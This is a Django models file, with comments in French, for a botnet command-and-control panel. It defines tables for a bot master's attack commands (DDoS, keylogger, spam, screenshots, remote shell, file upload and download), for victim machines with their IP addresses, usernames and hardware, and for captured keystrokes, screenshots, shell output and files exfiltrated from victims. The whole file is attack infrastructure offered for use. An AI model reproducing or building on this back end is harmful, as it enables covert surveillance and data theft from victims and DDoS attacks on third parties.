# -*- coding: utf-8 -*-
"""
Created on Sun Apr 24 00:44:43 2016

@author: abdelmajid
"""
from __future__ import unicode_literals

from django.db import models
import os

# Create your models here.

#================Model Continent================
class Continent(models.Model):
    """Zone géographique, pour la localisation d'agent"""
    nom=models.CharField(verbose_name="Zone:القارة",max_length=100)

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"Continent: "+unicode(self.nom)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

#================Model Pays================
class Pays(models.Model):
    """Pays, pour la localisation d'agent"""
    nom=models.CharField(verbose_name="Pays:الدولة",max_length=100)
    continent=models.ForeignKey("Continent",on_delete=models.SET_NULL,verbose_name="Zone:القارة",blank=True,null=True)
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"Pays: "+unicode(self.nom)+","+unicode(self.continent)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Pays'
        verbose_name_plural = 'Pays'

#================Model IpAdresse================

class IpAdresse(models.Model):
    """Un modele pour les adresses IP d'un client"""
    id_ip=models.AutoField(primary_key=True)
    ip_locale=models.CharField(verbose_name="IP locale",max_length=50,blank=True,null=True)
    ip_recue=models.CharField(verbose_name="IP reçue, ordinator name",max_length=50,blank=True,null=True)
    ip_inter=models.CharField(verbose_name="IP publique",max_length=50,blank=True,null=True)
    date_ajout=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date d'ajout")

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"IP:: L:"+unicode(self.ip_locale)+"/ R:"+unicode(self.ip_recue)+"/ I:"+unicode(self.ip_inter)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

#================Model TypeCommande================

class TypeCommande(models.Model):
    """Un modele pour les types des commandes, ça sera (DDos,keylogger,...)"""
    nom=models.CharField(verbose_name="type",max_length=100,primary_key=True)

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"TypeCommande: "+unicode(self.nom)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return u"TypeCommande: "+unicode(self.nom)

#================Model Commande================

class Commande(models.Model):
    """Un modele pour les  commandes, demandé par le botMaster pour les executer par les bots."""
    id_cmd=models.AutoField(primary_key=True)
    type_cmd=models.ForeignKey("TypeCommande",on_delete=models.CASCADE,verbose_name="Type commande")
    titre=models.CharField(verbose_name="Titre du commande",max_length=200)
    active=models.BooleanField(verbose_name="Active",default=True) #False: pour arreter l'attack.
    #le champ texte, et pour resudre tous les prb de manque d'attributs.
    texte=models.TextField(verbose_name="Texte du commande",blank=True,null=True)#px: en spam, en ajoute ici le message, ['email1',...],..
    date_ajout=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date d'ajout")
    date_debut=models.DateTimeField(verbose_name="Date debut",blank=True,null=True)
    date_fin=models.DateTimeField(verbose_name="Date fin",blank=True,null=True)
    duree=models.DateTimeField(verbose_name="Duree",blank=True,null=True)# en screen shot en les utiliser comme période. de capture...
    #si les dates db,fin, et duree sont null, (alors commande thread)
    url=models.TextField(verbose_name="Url du commande",blank=True,null=True)#pour DDos, download, upload

    clients=models.ManyToManyField('Client',
                              through='ClientCommande',
                              through_fields=('commande', 'client'),
                              )#experience, est qu'on peut savoir les client executant une commande.
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"Commande: "+unicode(self.id_cmd)+", "+unicode(self.titre)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)


#================Model Client================

class Client(models.Model):
    """Un modele pour les clients (victimes)"""
    id_client=models.AutoField(primary_key=True)
    pays=models.ForeignKey("Pays",on_delete=models.SET_NULL,verbose_name="Pays",blank=True,null=True)
    ipadresse=models.ForeignKey("IpAdresse",on_delete=models.SET_NULL,verbose_name="IP",blank=True,null=True)
    hostname=models.CharField(verbose_name="Host du victime, ordinator name",max_length=100)
    dateajout=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date d'ajout")
    connecte=models.BooleanField(default=True)
    actif=models.BooleanField(default=True)# si False, ce client sera rien faire, meme s'il est en ligne
    vue=models.BooleanField(default=False)# Pour affichier au bootMaster les nouveaux agents.
    ville=models.CharField(verbose_name="Ville",max_length=100,default="Inconnue")
    date_der_acces=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date d'ajout")
    src=models.CharField(max_length=256,verbose_name="Chemin de bot",blank=True,null=True)
    #infos concernant la machine du victime
    #COMPUTERNAME = models.CharField(verbose_name="Nom de l'ordinateur ",max_length=100) # NORUTU_AM (HOSTNAME)
    USERDOMAIN = models.CharField(verbose_name="Domain utilisateur ",max_length=100) # NORUTU_AM
    USERNAME = models.CharField(verbose_name="Nom de l'utilisateur ",max_length=100) # abdelmajid
    PROCESSOR_IDENTIFIER = models.CharField(verbose_name="Processeur ",max_length=100) # x86 Family 6 Model 15 Stepping 13, GenuineIntel
    PROCESSOR_REVISION = models.CharField(verbose_name="Revision processeur ",max_length=100) # 0f0d
    PROCESSOR_ARCHITECTURE = models.CharField(verbose_name="Architecture ",max_length=100) # x86
    NUMBER_OF_PROCESSORS =models.IntegerField(default=-1,verbose_name="Nombre de processeurs")#6
    processor_level =models.IntegerField(default=-1,verbose_name="processor level")#6
    syetem=models.CharField(verbose_name="Système d'exploitation",max_length=100) # Windows/23-bits)

    commandes=models.ManyToManyField('Commande',
                              through='ClientCommande',
                              through_fields=('client', 'commande'),
                              )

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Client Victim'
        verbose_name_plural = 'Clients victimes'

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere"""
        return u"Vectim: "+unicode(self.id_client)+":"+unicode(self.hostname)+"/"+unicode(self.USERNAME)+(unicode(", En ligne") if self.connecte else unicode(", Hors ligne"))

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

 #===============Model Message=================

class ClientCommande(models.Model):
    """Les commandes executer par des clients, association: Client <--> Commande"""
    client=models.ForeignKey('Client', on_delete=models.CASCADE)
    commande=models.ForeignKey('Commande', on_delete=models.CASCADE)
    executee=models.BooleanField(verbose_name="Exécutée",default=False)
    execution_vue=models.BooleanField(verbose_name="Exécution vue",default=False)
    #date_affectation: c'est la date quand la commande donnee au bot.
    date_affectation=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date affactationa")

    #++++++++++++++++++++++++++++++++=
    class Meta:
        verbose_name = 'Client Commande'
        verbose_name_plural = 'Clients Commandes'
        unique_together = ('client', 'commande')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"Vectim: "+unicode(self.client.hostname)+"/"+unicode(self.client.USERNAME)+", CMD: "+unicode(self.commande.titre)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

#****************************************************************************************************************#
#*********************** les models pour stocker les infos et l'execution des commandes par des clients *********#
#****************************************************************************************************************#

 #===============Model AttackExecution=================

class AttackExecution(models.Model):
    """Le model parent, de toutes les executions des attacks"""
    id_ae=models.AutoField(primary_key=True)
    date_insertion_ae=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date insertion")
    vue=models.BooleanField(default=False)
    client_commande_ae=models.ForeignKey('ClientCommande',on_delete=models.CASCADE)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        abstract=True # ce model regroupe des champs pour ses enfants .(Aucun table dans la base de données nommmée AttackExecution)
        verbose_name = 'Attack execution'
        verbose_name_plural = 'Attack executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        return u"Attack-"+unicode(self.client_commande_ae.commande.type_cmd.nom)+"-: Vectim: "+unicode(self.client_commande_ae)+"/::"+unicode(self.date_insertion_ae)+"/vue="+unicode(self.vue)

    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

 #===============Model KeyLoggerExecution=================

class KeyLoggerExecution(AttackExecution):
    """Les messages des keylogger pour un client execute une commande de type Keylogger"""
    text_ke=models.TextField(verbose_name="Texte de message")

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Keylogger execution'
        verbose_name_plural = 'Keylogger executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        keyl=AttackExecution.__unicode__(self)
        keyl+="*****msg*****\n"+unicode(self.text_ke)
        return keyl
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

 #===============Model ScreenShotExecution=================

class ScreenShotExecution(AttackExecution):
    """Les images des screenshot pour un client execute une commande de type screenshot"""
    img_sse=models.ImageField(upload_to='screenshot/%Y/%m/%d/',max_length=2000)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Screenshot execution'
        verbose_name_plural = 'Screenshot executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        keyl=AttackExecution.__unicode__(self)
        return keyl
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)
    #+++++++++++++++++++++++++++++++++
    def delete(self,*args,**kwargs):
        try:
            os.remove(self.img_sse.path)
        except:
            a=9

        super(ScreenShotExecution, self).delete(*args,**kwargs)

 #===============Model ScreenShotExecution=================
class ShellExecution(AttackExecution):
    """Les resulatats d'execution d'une commande shell"""
    resultats=models.TextField(verbose_name="Resultats",blank=True,null=True)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Shell execution'
        verbose_name_plural = 'Shell executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        keyl=AttackExecution.__unicode__(self)
        return keyl
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

 #===============Model UploadExecution=================

class UploadExecution(AttackExecution):
    """Les fichiers télécharger depuis la machine de l'agent"""
    fichier=models.FileField(upload_to='uploads/%Y/%m/%d/',blank=True,null=True)
    results=models.TextField(verbose_name="Résultats")

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Upload execution'
        verbose_name_plural = 'Upload executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        keyl=AttackExecution.__unicode__(self)
        return keyl
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)
    #+++++++++++++++++++++++++++++++++
    def delete(self,*args,**kwargs):
        try:
            os.remove(self.fichier.path)
        except:
            a=6
        super(UploadExecution, self).delete(*args,**kwargs)

 #===============Model DownloadExecution=================

class DownloadExecution(AttackExecution):
    """Les executions de téléchargement des fichiers à la machine des bots"""
    emplacement=models.CharField(max_length=256,verbose_name="emplacement",blank=True,null=True)
    results=models.TextField(verbose_name="Résultats",blank=True,null=True)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Download execution'
        verbose_name_plural = 'Download executions'
        #unique_together = ('typeN', 'codeN')#remplace la notion de clé primaire composée.

    #+++++++++++++++++++++++++++++++++
    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        """représentation sous forme d'une chaine de caractere unicode"""
        keyl=AttackExecution.__unicode__(self)
        return keyl
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        """représentation sous forme d'une chaine de caractere"""
        return unicode(self)

"""
 #===============Model Message=================

class Message(models.Model):
    "Les messages pour les victimes"
    id_message=models.AutoField(primary_key=True)
    client=models.ForeignKey("Client",on_delete=models.CASCADE)
    text=models.TextField(verbose_name="Texte de message")
    datem=models.DateTimeField(auto_now=False,auto_now_add=True, verbose_name="Date d'ajoute")
    vue=models.BooleanField(default=False)

    #+++++++++++++++++++++++++++++++++
    class Meta:
        verbose_name = 'Méssage'
        verbose_name_plural = 'Méssages'

    #+++++++++++++++++++++++++++++++++
    def __unicode__(self):
        "représentation sous forme d'une chaine de caractere"
        tx="********\nVectim: "+unicode(self.client)+"\n text: "+unicode(self.text)+", date: "+unicode(self.datem)+", Message "
        tx+=unicode("Vue") if self.vue else unicode("Non vue")
        return tx+"\n"
    #+++++++++++++++++++++++++++++++++
    def __str__(self):
        représentation sous forme d'une chaine de caractere"
        tx="********\nVectim: "+str(self.client)+"\n text: "+str(self.text)+", date: "+str(self.datem)+", Message "
        tx+="Vue" if self.vue else "Non vue"
        return u""+tx+"\n"
"""
